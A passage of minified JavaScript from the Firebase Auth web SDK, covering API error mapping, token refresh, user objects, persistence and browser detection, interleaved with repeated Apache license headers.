 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */function b(){var e;return"undefined"!=typeof self&&(null===(e=self.location)||void 0===e?void 0:e.href)||""}function _(){var e;return"undefined"!=typeof self&&(null===(e=self.location)||void 0===e?void 0:e.protocol)||null}
/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class I{constructor(e,t){this.shortDelay=e,this.longDelay=t,t>e||y("Short delay should be less than long delay!"),this.isMobile=(0,i.uI)()||(0,i.b$)()}get(){return"undefined"!=typeof navigator&&navigator&&"onLine"in navigator&&"boolean"==typeof navigator.onLine&&("http:"===_()||"https:"===_()||(0,i.ru)()||"connection"in navigator)&&!navigator.onLine?Math.min(5e3,this.shortDelay):this.isMobile?this.longDelay:this.shortDelay}}
/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */function E(e,t){e.emulator||y("Emulator should always be set here");let{url:n}=e.emulator;return t?`${n}${t.startsWith("/")?t.slice(1):t}`:n}
/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class T{static initialize(e,t,n){this.fetchImpl=e,t&&(this.headersImpl=t),n&&(this.responseImpl=n)}static fetch(){return this.fetchImpl?this.fetchImpl:"undefined"!=typeof self&&"fetch"in self?self.fetch:void y("Could not find fetch implementation, make sure you call FetchProvider.initialize() with an appropriate polyfill")}static headers(){return this.headersImpl?this.headersImpl:"undefined"!=typeof self&&"Headers"in self?self.Headers:void y("Could not find Headers implementation, make sure you call FetchProvider.initialize() with an appropriate polyfill")}static response(){return this.responseImpl?this.responseImpl:"undefined"!=typeof self&&"Response"in self?self.Response:void y("Could not find Response implementation, make sure you call FetchProvider.initialize() with an appropriate polyfill")}}
/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */let S={CREDENTIAL_MISMATCH:"custom-token-mismatch",MISSING_CUSTOM_TOKEN:"internal-error",INVALID_IDENTIFIER:"invalid-email",MISSING_CONTINUE_URI:"internal-error",INVALID_PASSWORD:"wrong-password",MISSING_PASSWORD:"missing-password",EMAIL_EXISTS:"email-already-in-use",PASSWORD_LOGIN_DISABLED:"operation-not-allowed",INVALID_IDP_RESPONSE:"invalid-credential",INVALID_PENDING_TOKEN:"invalid-credential",FEDERATED_USER_ID_ALREADY_LINKED:"credential-already-in-use",MISSING_REQ_TYPE:"internal-error",EMAIL_NOT_FOUND:"user-not-found",RESET_PASSWORD_EXCEED_LIMIT:"too-many-requests",EXPIRED_OOB_CODE:"expired-action-code",INVALID_OOB_CODE:"invalid-action-code",MISSING_OOB_CODE:"internal-error",CREDENTIAL_TOO_OLD_LOGIN_AGAIN:"requires-recent-login",INVALID_ID_TOKEN:"invalid-user-token",TOKEN_EXPIRED:"user-token-expired",USER_NOT_FOUND:"user-token-expired",TOO_MANY_ATTEMPTS_TRY_LATER:"too-many-requests",INVALID_CODE:"invalid-verification-code",INVALID_SESSION_INFO:"invalid-verification-id",INVALID_TEMPORARY_PROOF:"invalid-credential",MISSING_SESSION_INFO:"missing-verification-id",SESSION_EXPIRED:"code-expired",MISSING_ANDROID_PACKAGE_NAME:"missing-android-pkg-name",UNAUTHORIZED_DOMAIN:"unauthorized-continue-uri",INVALID_OAUTH_CLIENT_ID:"invalid-oauth-client-id",ADMIN_ONLY_OPERATION:"admin-restricted-operation",INVALID_MFA_PENDING_CREDENTIAL:"invalid-multi-factor-session",MFA_ENROLLMENT_NOT_FOUND:"multi-factor-info-not-found",MISSING_MFA_ENROLLMENT_ID:"missing-multi-factor-info",MISSING_MFA_PENDING_CREDENTIAL:"missing-multi-factor-session",SECOND_FACTOR_EXISTS:"second-factor-already-in-use",SECOND_FACTOR_LIMIT_EXCEEDED:"maximum-second-factor-count-exceeded",BLOCKING_FUNCTION_ERROR_RESPONSE:"internal-error"},k=new I(3e4,6e4);function A(e,t){return e.tenantId&&!t.tenantId?Object.assign(Object.assign({},t),{tenantId:e.tenantId}):t}async function C(e,t,n,r,s={}){return N(e,s,(async()=>{let s={},a={};r&&("GET"===t?a=r:s={body:JSON.stringify(r)});let o=(0,i.xO)(Object.assign({key:e.config.apiKey},a)).slice(1),l=await e._getAdditionalHeaders();return l["Content-Type"]="application/json",e.languageCode&&(l["X-Firebase-Locale"]=e.languageCode),T.fetch()(D(e,e.config.apiHost,n,o),Object.assign({method:t,headers:l,referrerPolicy:"no-referrer"},s))}))}async function N(e,t,n){e._canInitEmulator=!1;let r=Object.assign(Object.assign({},S),t);try{let t=new R(e),i=await Promise.race([n(),t.promise]);t.clearNetworkTimeout();let s=await i.json();if("needConfirmation"in s)throw x(e,"account-exists-with-different-credential",s);if(i.ok&&!("errorMessage"in s))return s;{let t=i.ok?s.errorMessage:s.error.message,[n,a]=t.split(" : ");if("FEDERATED_USER_ID_ALREADY_LINKED"===n)throw x(e,"credential-already-in-use",s);if("EMAIL_EXISTS"===n)throw x(e,"email-already-in-use",s);if("USER_DISABLED"===n)throw x(e,"user-disabled",s);let o=r[n]||n.toLowerCase().replace(/[_\s]+/g,"-");if(a)throw p(e,o,a);d(e,o)}}catch(t){if(t instanceof i.ZR)throw t;d(e,"network-request-failed",{message:String(t)})}}async function O(e,t,n,r,i={}){let s=await C(e,t,n,r,i);return"mfaPendingCredential"in s&&d(e,"multi-factor-auth-required",{_serverResponse:s}),s}function D(e,t,n,r){let i=`${t}${n}?${r}`;return e.config.emulator?E(e.config,i):`${e.config.apiScheme}://${i}`}class R{constructor(e){this.auth=e,this.timer=null,this.promise=new Promise(((e,t)=>{this.timer=setTimeout((()=>t(f(this.auth,"network-request-failed"))),k.get())}))}clearNetworkTimeout(){clearTimeout(this.timer)}}function x(e,t,n){let r={appName:e.name};n.email&&(r.email=n.email),n.phoneNumber&&(r.phoneNumber=n.phoneNumber);let i=f(e,t,r);return i.customData._tokenResponse=n,i}
/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
function P(e){if(e)try{let t=new Date(Number(e));if(!isNaN(t.getTime()))return t.toUTCString()}catch(e){}}function L(e){return 1e3*Number(e)}function M(e){let[t,n,r]=e.split(".");if(void 0===t||void 0===n||void 0===r)return h("JWT malformed, contained fewer than 3 sections"),null;try{let e=(0,i.tV)(n);return e?JSON.parse(e):(h("Failed to decode base64 JWT payload"),null)}catch(e){return h("Caught error parsing JWT payload as JSON",null==e?void 0:e.toString()),null
/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */}}async function F(e,t,n=!1){if(n)return t;try{return await t}catch(t){throw t instanceof i.ZR&&function({code:e}){return"auth/user-disabled"===e||"auth/user-token-expired"===e}(t)&&e.auth.currentUser===e&&await e.auth.signOut(),t
/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */}}class U{constructor(e){this.user=e,this.isRunning=!1,this.timerId=null,this.errorBackoff=3e4}_start(){this.isRunning||(this.isRunning=!0,this.schedule())}_stop(){this.isRunning&&(this.isRunning=!1,null!==this.timerId&&clearTimeout(this.timerId))}getInterval(e){var t;if(e){let e=this.errorBackoff;return this.errorBackoff=Math.min(2*this.errorBackoff,96e4),e}{this.errorBackoff=3e4;let e=(null!==(t=this.user.stsTokenManager.expirationTime)&&void 0!==t?t:0)-Date.now()-3e5;return Math.max(0,e)}}schedule(e=!1){if(!this.isRunning)return;let t=this.getInterval(e);this.timerId=setTimeout((async()=>{await this.iteration()}),t)}async iteration(){try{await this.user.getIdToken(!0)}catch(e){return void("auth/network-request-failed"===(null==e?void 0:e.code)&&this.schedule(!0))}this.schedule()}}
/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class V{constructor(e,t){this.createdAt=e,this.lastLoginAt=t,this._initializeTime()}_initializeTime(){this.lastSignInTime=P(this.lastLoginAt),this.creationTime=P(this.createdAt)}_copy(e){this.createdAt=e.createdAt,this.lastLoginAt=e.lastLoginAt,this._initializeTime()}toJSON(){return{createdAt:this.createdAt,lastLoginAt:this.lastLoginAt}}}
/**
 * @license
 * Copyright 2019 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */async function j(e){var t;let n=e.auth,r=await e.getIdToken(),i=await F(e,async function(e,t){return C(e,"POST","/v1/accounts:lookup",t)}(n,{idToken:r}));g(null==i?void 0:i.users.length,n,"internal-error");let s=i.users[0];e._notifyReloadListener(s);let a=(null===(t=s.providerUserInfo)||void 0===t?void 0:t.length)?s.providerUserInfo.map((e=>{var{providerId:t}=e,n=(0,o._T)(e,["providerId"]);return{providerId:t,uid:n.rawId||"",displayName:n.displayName||null,email:n.email||null,phoneNumber:n.phoneNumber||null,photoURL:n.photoUrl||null}})):[],l=function(e,t){return[...e.filter((e=>!t.some((t=>t.providerId===e.providerId)))),...t]}(e.providerData,a),u=e.isAnonymous,c=!(e.email&&s.passwordHash||(null==l?void 0:l.length)),h={uid:s.localId,displayName:s.displayName||null,photoURL:s.photoUrl||null,email:s.email||null,emailVerified:s.emailVerified||!1,phoneNumber:s.phoneNumber||null,tenantId:s.tenantId||null,providerData:l,metadata:new V(s.createdAt,s.lastLoginAt),isAnonymous:!!u&&c};Object.assign(e,h)}
/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
async function B(e,t){let n=await N(e,{},(async()=>{let n=(0,i.xO)({grant_type:"refresh_token",refresh_token:t}).slice(1),{tokenApiHost:r,apiKey:s}=e.config,a=D(e,r,"/v1/token",`key=${s}`),o=await e._getAdditionalHeaders();return o["Content-Type"]="application/x-www-form-urlencoded",T.fetch()(a,{method:"POST",headers:o,body:n})}));return{accessToken:n.access_token,expiresIn:n.expires_in,refreshToken:n.refresh_token}}
/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class q{constructor(){this.refreshToken=null,this.accessToken=null,this.expirationTime=null}get isExpired(){return!this.expirationTime||Date.now()>this.expirationTime-3e4}updateFromServerResponse(e){g(e.idToken,"internal-error"),g(void 0!==e.idToken,"internal-error"),g(void 0!==e.refreshToken,"internal-error");let t="expiresIn"in e&&void 0!==e.expiresIn?Number(e.expiresIn):function(e){let t=M(e);return g(t,"internal-error"),g(void 0!==t.exp,"internal-error"),g(void 0!==t.iat,"internal-error"),Number(t.exp)-Number(t.iat)}(e.idToken);this.updateTokensAndExpiration(e.idToken,e.refreshToken,t)}async getToken(e,t=!1){return g(!this.accessToken||this.refreshToken,e,"user-token-expired"),t||!this.accessToken||this.isExpired?this.refreshToken?(await this.refresh(e,this.refreshToken),this.accessToken):null:this.accessToken}clearRefreshToken(){this.refreshToken=null}async refresh(e,t){let{accessToken:n,refreshToken:r,expiresIn:i}=await B(e,t);this.updateTokensAndExpiration(n,r,Number(i))}updateTokensAndExpiration(e,t,n){this.refreshToken=t||null,this.accessToken=e||null,this.expirationTime=Date.now()+1e3*n}static fromJSON(e,t){let{refreshToken:n,accessToken:r,expirationTime:i}=t,s=new q;return n&&(g("string"==typeof n,"internal-error",{appName:e}),s.refreshToken=n),r&&(g("string"==typeof r,"internal-error",{appName:e}),s.accessToken=r),i&&(g("number"==typeof i,"internal-error",{appName:e}),s.expirationTime=i),s}toJSON(){return{refreshToken:this.refreshToken,accessToken:this.accessToken,expirationTime:this.expirationTime}}_assign(e){this.accessToken=e.accessToken,this.refreshToken=e.refreshToken,this.expirationTime=e.expirationTime}_clone(){return Object.assign(new q,this.toJSON())}_performRefresh(){return y("not implemented")}}
/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */function $(e,t){g("string"==typeof e||void 0===e,"internal-error",{appName:t})}class z{constructor(e){var{uid:t,auth:n,stsTokenManager:r}=e,i=(0,o._T)(e,["uid","auth","stsTokenManager"]);this.providerId="firebase",this.proactiveRefresh=new U(this),this.reloadUserInfo=null,this.reloadListener=null,this.uid=t,this.auth=n,this.stsTokenManager=r,this.accessToken=r.accessToken,this.displayName=i.displayName||null,this.email=i.email||null,this.emailVerified=i.emailVerified||!1,this.phoneNumber=i.phoneNumber||null,this.photoURL=i.photoURL||null,this.isAnonymous=i.isAnonymous||!1,this.tenantId=i.tenantId||null,this.providerData=i.providerData?[...i.providerData]:[],this.metadata=new V(i.createdAt||void 0,i.lastLoginAt||void 0)}async getIdToken(e){let t=await F(this,this.stsTokenManager.getToken(this.auth,e));return g(t,this.auth,"internal-error"),this.accessToken!==t&&(this.accessToken=t,await this.auth._persistUserIfCurrent(this),this.auth._notifyListenersIfCurrent(this)),t}getIdTokenResult(e){return async function(e,t=!1){let n=(0,i.m9)(e),r=await n.getIdToken(t),s=M(r);g(s&&s.exp&&s.auth_time&&s.iat,n.auth,"internal-error");let a="object"==typeof s.firebase?s.firebase:void 0,o=null==a?void 0:a.sign_in_provider;return{claims:s,token:r,authTime:P(L(s.auth_time)),issuedAtTime:P(L(s.iat)),expirationTime:P(L(s.exp)),signInProvider:o||null,signInSecondFactor:(null==a?void 0:a.sign_in_second_factor)||null}}(this,e)}reload(){return async function(e){let t=(0,i.m9)(e);await j(t),await t.auth._persistUserIfCurrent(t),t.auth._notifyListenersIfCurrent(t)}(this)}_assign(e){this!==e&&(g(this.uid===e.uid,this.auth,"internal-error"),this.displayName=e.displayName,this.photoURL=e.photoURL,this.email=e.email,this.emailVerified=e.emailVerified,this.phoneNumber=e.phoneNumber,this.isAnonymous=e.isAnonymous,this.tenantId=e.tenantId,this.providerData=e.providerData.map((e=>Object.assign({},e))),this.metadata._copy(e.metadata),this.stsTokenManager._assign(e.stsTokenManager))}_clone(e){let t=new z(Object.assign(Object.assign({},this),{auth:e,stsTokenManager:this.stsTokenManager._clone()}));return t.metadata._copy(this.metadata),t}_onReload(e){g(!this.reloadListener,this.auth,"internal-error"),this.reloadListener=e,this.reloadUserInfo&&(this._notifyReloadListener(this.reloadUserInfo),this.reloadUserInfo=null)}_notifyReloadListener(e){this.reloadListener?this.reloadListener(e):this.reloadUserInfo=e}_startProactiveRefresh(){this.proactiveRefresh._start()}_stopProactiveRefresh(){this.proactiveRefresh._stop()}async _updateTokensIfNecessary(e,t=!1){let n=!1;e.idToken&&e.idToken!==this.stsTokenManager.accessToken&&(this.stsTokenManager.updateFromServerResponse(e),n=!0),t&&await j(this),await this.auth._persistUserIfCurrent(this),n&&this.auth._notifyListenersIfCurrent(this)}async delete(){let e=await this.getIdToken();return await F(this,async function(e,t){return C(e,"POST","/v1/accounts:delete",t)}(this.auth,{idToken:e})),this.stsTokenManager.clearRefreshToken(),this.auth.signOut()}toJSON(){return Object.assign(Object.assign({uid:this.uid,email:this.email||void 0,emailVerified:this.emailVerified,displayName:this.displayName||void 0,isAnonymous:this.isAnonymous,photoURL:this.photoURL||void 0,phoneNumber:this.phoneNumber||void 0,tenantId:this.tenantId||void 0,providerData:this.providerData.map((e=>Object.assign({},e))),stsTokenManager:this.stsTokenManager.toJSON(),_redirectEventId:this._redirectEventId},this.metadata.toJSON()),{apiKey:this.auth.config.apiKey,appName:this.auth.name})}get refreshToken(){return this.stsTokenManager.refreshToken||""}static _fromJSON(e,t){var n,r,i,s,a,o,l,u;let c=null!==(n=t.displayName)&&void 0!==n?n:void 0,h=null!==(r=t.email)&&void 0!==r?r:void 0,d=null!==(i=t.phoneNumber)&&void 0!==i?i:void 0,f=null!==(s=t.photoURL)&&void 0!==s?s:void 0,p=null!==(a=t.tenantId)&&void 0!==a?a:void 0,m=null!==(o=t._redirectEventId)&&void 0!==o?o:void 0,y=null!==(l=t.createdAt)&&void 0!==l?l:void 0,v=null!==(u=t.lastLoginAt)&&void 0!==u?u:void 0,{uid:w,emailVerified:b,isAnonymous:_,providerData:I,stsTokenManager:E}=t;g(w&&E,e,"internal-error");let T=q.fromJSON(this.name,E);g("string"==typeof w,e,"internal-error"),$(c,e.name),$(h,e.name),g("boolean"==typeof b,e,"internal-error"),g("boolean"==typeof _,e,"internal-error"),$(d,e.name),$(f,e.name),$(p,e.name),$(m,e.name),$(y,e.name),$(v,e.name);let S=new z({uid:w,auth:e,email:h,emailVerified:b,displayName:c,isAnonymous:_,photoURL:f,phoneNumber:d,tenantId:p,stsTokenManager:T,createdAt:y,lastLoginAt:v});return I&&Array.isArray(I)&&(S.providerData=I.map((e=>Object.assign({},e)))),m&&(S._redirectEventId=m),S}static async _fromIdTokenResponse(e,t,n=!1){let r=new q;r.updateFromServerResponse(t);let i=new z({uid:t.localId,auth:e,stsTokenManager:r,isAnonymous:n});return await j(i),i
/**
 * @license
 * Copyright 2019 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */}}class G{constructor(){this.type="NONE",this.storage={}}async _isAvailable(){return!0}async _set(e,t){this.storage[e]=t}async _get(e){let t=this.storage[e];return void 0===t?null:t}async _remove(e){delete this.storage[e]}_addListener(e,t){}_removeListener(e,t){}}
/**
 * @license
 * Copyright 2019 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */function K(e,t,n){return`firebase:${e}:${t}:${n}`}G.type="NONE";class H{constructor(e,t,n){this.persistence=e,this.auth=t,this.userKey=n;let{config:r,name:i}=this.auth;this.fullUserKey=K(this.userKey,r.apiKey,i),this.fullPersistenceKey=K("persistence",r.apiKey,i),this.boundEventHandler=t._onStorageEvent.bind(t),this.persistence._addListener(this.fullUserKey,this.boundEventHandler)}setCurrentUser(e){return this.persistence._set(this.fullUserKey,e.toJSON())}async getCurrentUser(){let e=await this.persistence._get(this.fullUserKey);return e?z._fromJSON(this.auth,e):null}removeCurrentUser(){return this.persistence._remove(this.fullUserKey)}savePersistenceForRedirect(){return this.persistence._set(this.fullPersistenceKey,this.persistence.type)}async setPersistence(e){if(this.persistence===e)return;let t=await this.getCurrentUser();return await this.removeCurrentUser(),this.persistence=e,t?this.setCurrentUser(t):void 0}delete(){this.persistence._removeListener(this.fullUserKey,this.boundEventHandler)}static async create(e,t,n="authUser"){if(!t.length)return new H(w(G),e,n);let r=(await Promise.all(t.map((async e=>{if(await e._isAvailable())return e})))).filter((e=>e)),i=r[0]||w(G),s=K(n,e.config.apiKey,e.name),a=null;for(let n of t)try{let t=await n._get(s);if(t){let r=z._fromJSON(e,t);n!==i&&(a=r),i=n;break}}catch(e){}let o=r.filter((e=>e._shouldAllowMigration));return i._shouldAllowMigration&&o.length&&(i=o[0],a&&await i._set(s,a.toJSON()),await Promise.all(t.map((async e=>{if(e!==i)try{await e._remove(s)}catch(e){}})))),new H(i,e,n)
/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */}}function W(e){let t=e.toLowerCase();if(t.includes("opera/")||t.includes("opr/")||t.includes("opios/"))return"Opera";if(Y(t))return"IEMobile";if(t.includes("msie")||t.includes("trident/"))return"IE";{if(t.includes("edge/"))return"Edge";if(Q(t))return"Firefox";if(t.includes("silk/"))return"Silk";if(ee(t))return"Blackberry";if(te(t))return"Webos";if(J(t))return"Safari";if((t.includes("chrome/")||X(t))&&!t.includes("edge/"))return"Chrome";if(Z(t))return"Android";let n=e.match(/([a-zA-Z\d\.]+)\/[a-zA-Z\d\.]*$/);if(2===(null==n?void 0:n.length))return n[1]}return"Other"}function Q(e=(0,i.z$)()){return/firefox\//i.test(e)}function J(e=(0,i.z$)()){let t=e.toLowerCase();return t.includes("safari/")&&!t.includes("chrome/")&&!t.includes("crios/")&&!t.includes("android")}function X(e=(0,i.z$)()){return/crios\//i.test(e)}function Y(e=(0,i.z$)()){return/iemobile/i.test(e)}function Z(e=(0,i.z$)()){return/android/i.test(e)}function ee(e=(0,i.z$)()){return/blackberry/i.test(e)}function te(e=(0,i.z$)()){return/webos/i.test(e)}function ne(e=(0,i.z$)()){return/iphone|ipad|ipod/i.test(e)||/macintosh/i.test(e)&&/mobile/i.test(e)}function re(e=(0,i.z$)()){return ne(e)||Z(e)||te(e)||ee(e)||/windows phone/i.test(e)||Y(e)}
/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */function ie(e,t=[]){let n;switch(e){case"Browser":n=W((0,i.z$)());break;case"Worker":n=`${W((0,i.z$)())}-${e}`;break;default:n=e}let r=t.length?t.join(","):"FirebaseCore-web";return`${n}/JsCore/${s.Jn}/${r}`
/**
 * @license
 * Copyright 2022 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */}class se{constructor(e){this.auth=e,this.queue=[]}pushCallback(e,t){let n=t=>new Promise(((n,r)=>{try{n(e(t))}catch(e){r(e)}}));n.onAbort=t,this.queue.push(n);let r=this.queue.length-1;return()=>{this.queue[r]=()=>Promise.resolve()}}async runMiddleware(e){if(this.auth.currentUser===e)return;let t=[];try{for(let n of this.queue)await n(e),n.onAbort&&t.push(n.onAbort)}catch(e){for(let n of(t.reverse(),t))try{n()}catch(e){}throw this.auth._errorFactory.create("login-blocked",{originalMessage:null==e?void 0:e.message})}}}
/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class ae{constructor(e,t,n){this.app=e,this.heartbeatServiceProvider=t,this.config=n,this.currentUser=null,this.emulatorConfig=null,this.operations=Promise.resolve(),this.authStateSubscription=new le(this),this.idTokenSubscription=new le(this),this.beforeStateQueue=new se(this),this.redirectUser=null,this.isProactiveRefreshEnabled=!1,this._canInitEmulator=!0,this._isInitialized=!1,this._deleted=!1,this._initializationPromise=null,this._popupRedirectResolver=null,this._errorFactory=u,this.lastNotifiedUid=void 0,this.languageCode=null,this.tenantId=null,this.settings={appVerificationDisabledForTesting:!1},this.frameworks=[],this.name=e.name,this.clientVersion=n.sdkClientVersion}_initializeWithPersistence(e,t){return t&&(this._popupRedirectResolver=w(t)),this._initializationPromise=this.queue((async()=>{var n,r;if(!this._deleted&&(this.persistenceManager=await H.create(this,e),!this._deleted)){if(null===(n=this._popupRedirectResolver)||void 0===n?void 0:n._shouldInitProactively)try{await this._popupRedirectResolver._initialize(this)}catch(e){}await this.initializeCurrentUser(t),this.lastNotifiedUid=(null===(r=this.currentUser)||void 0===r?void 0:r.uid)||null,this._deleted||(this._isInitialized=!0)}})),this._initializationPromise}async _onStorageEvent(){if(this._deleted)return;let e=await this.assertedPersistence.getCurrentUser();if(this.currentUser||e){if(this.currentUser&&e&&this.currentUser.uid===e.uid)return this._currentUser._assign(e),void await 